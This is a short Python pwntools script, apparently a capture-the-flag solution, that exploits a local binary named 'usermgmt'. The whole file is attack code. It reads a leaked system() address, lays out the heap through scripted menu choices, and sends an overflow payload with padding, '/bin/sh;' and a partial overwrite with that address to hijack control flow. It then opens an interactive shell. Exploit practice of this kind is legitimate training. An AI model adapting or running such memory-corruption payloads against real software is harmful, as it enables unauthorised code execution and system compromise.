from pwn import *

sock = process('./usermgmt')
sock.recvuntil('need: ')
system_addr = int(sock.recvline().rstrip()[:-1], 16)
print('[+] system addr: ' + hex(system_addr))
binsh = '/bin/sh;'
heap_layout = ('1\n1\n1\n1\n' +
               '3\n0\n' +
               '1\n1\n1\n1\n' +
               '1\n2\n2\n2\n')
payload = (heap_layout +
           '4\n0\n' +
           'g' * 32 + binsh + ' ' * 16 + p64(system_addr)[:5] + '\x7f' + '\n'
           '5\n1\n')
sock.sendline(payload)
sock.interactive()
